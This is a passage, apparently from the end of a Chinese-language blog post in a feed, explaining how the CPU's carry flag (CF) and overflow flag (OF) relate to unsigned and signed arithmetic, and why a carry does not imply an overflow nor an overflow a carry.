<p>==&gt;也就是说操作数进入运算器后，运算器会进行两次运算，分别设置CF和OF标志位</p>
<p><strong>至于如何利用这两个设置好的标志位，这将取决于程序员</strong></p>
<ul>
<li>如果程序员想要进行<strong>有符号数运算</strong>，那么将关注<strong>OF</strong>的情况，通过OF标志位判断计算结果是否溢出</li>
<li>如果程序员想要进行<strong>无符号数运算</strong>，那么将关注<strong>CF</strong>的情况，通过CF标志位判断是否需要进位</li>
</ul>
<p>另外，还可以这样说</p>
<ul>
<li>对于<strong>无符号数</strong>来说，只有是否<strong>进位</strong>，不存在溢出</li>
<li>对于<strong>有符号数</strong>来说，只有是否<strong>溢出</strong>，不存在进位</li>
</ul>
<p>存在这样的关系</p>
<p>无符号数 &lt;------&gt; 进位 &lt;------&gt; CF</p>
<p>有符号数 &lt;------&gt; 溢出 &lt;------&gt; OF</p>
<h1 id="0x04-回到问题">0x04 回到问题</h1>
<p>Q：CF表示进位，OF表示溢出，那么进位是否表示溢出，又或者溢出是否就一定会有进位？</p>
<p>A：进位不一定溢出，溢出也不一定进位，因为这两个概念对应两个不同的标志位CF、OF，而这两个标志位又是相对有符号数和无符号数来说的。</p>
<ul>
<li>
<p>如果我们将操作数看做无符号数，此时只需要考虑是否进位，与是否溢出的无关</p>
</li>
<li>
<p>如果将操作数看做有符号数，此时我们应该关心运算结果是否溢出，与是否进位无关</p>
</li>
</ul>
<p>如果看不懂，可以回看理解的过程</p>
<p>如果理解或者解答有误，请及时联系，我将第一时间进行更正，万分谢谢！</p>
]]></content>
    </entry>
</feed>